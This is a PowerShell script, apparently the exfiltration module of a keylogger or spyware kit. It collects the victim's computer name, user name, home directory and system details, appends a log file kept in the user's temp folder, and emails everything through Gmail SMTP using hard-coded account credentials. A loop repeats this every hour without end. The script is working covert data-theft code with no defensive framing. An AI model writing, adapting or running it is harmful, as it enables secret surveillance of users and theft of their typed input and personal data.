$Global:Email = "MyEmail@email.com"
$Global:Password = "MyPassword"
$Interval = 60
function SendMail {
	param (
		[string]$Email = $Global:Email,
		[string]$Password = $Global:Password,
		[string]$logFile = "$env:temp\$env:username.log"
	)
	
	Write-Host "Email: $Email"
	Write-Host "Password: $Password"
    $Subject = "You got mail from $env:USERNAME!"
    $Body = @"
                This email has been sent from $env:COMPUTERNAME
                -----------------------------------------------------------------
                Computer Name: $env:computername
                User Name: $env:username
                Home Directory: $env:userprofile
                Operating System: $env:OS
                Processor: $env:PROCESSOR_ARCHITECTURE $env:PROCESSOR_IDENTIFIER

"@
    Write-Host "Getting file content, if exists"
	if (Test-Path $logFile) {
        $Body += Get-Content -Path $logFile -Raw
    }
	Write-Host "Preparing email sending"
    $SMTPServer = "smtp.gmail.com"
    $SMTPClient = New-Object Net.Mail.SMTPClient($SMTPServer, 587)
    $SMTPClient.EnableSSL = $true
    $SMTPClient.Credentials = New-Object System.Net.NetworkCredential($Email, $Password)
	Write-Host "Sending the email..."
    $SMTPClient.Send($Email, $Email, $Subject, $Body)
	Write-Host "Email sent!"
}


function ScheduleMail {
	
	param (
		[int]$MinutesInterval = 60
	)
		Write-Host "Scheduling mail..."
        SendMail
		$now = Get-Date
        $SecondsInterval = $MinutesInterval * 60
        $nextInterval = $now.AddMinutes($MinutesInterval - ($now.Minute % $MinutesInterval))
		$timeLeft = ($nextInterval - $now).TotalSeconds
		Write-Host "Sleeping for $timeLeft seconds"
        Start-Sleep -Seconds $timeLeft
        while ($true) {
			Write-Host "Time to send the mail!"
            SendMail
            Write-Host "Sleeping for $SecondsInterval seconds"
			Start-Sleep -Seconds $SecondsInterval
        }
		Write-Host "Done sending mail..."
}

echo "Send Mail imported successfully"

